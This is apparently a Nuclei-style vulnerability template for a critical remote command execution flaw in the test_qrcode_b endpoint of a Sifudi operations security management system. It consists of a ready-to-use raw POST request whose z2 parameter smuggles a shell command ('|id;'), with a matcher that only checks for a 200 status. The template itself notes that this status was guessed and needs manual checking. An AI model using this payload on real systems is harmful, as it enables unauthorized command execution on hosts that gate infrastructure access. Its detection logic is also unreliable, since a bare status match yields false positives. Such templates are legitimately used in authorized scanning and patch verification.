id: poc-a007bd10501ff377de32
info:
  name: 思福迪运维安全管理系统test_qrcode_b存在远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'POST /bhost/test_qrcode_b HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Go-http-client/1.1

    Content-Length: 23

    Accept-Encoding: gzip, deflate

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Referer:


    z1=1&z2="|id;"&z3=bhost'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
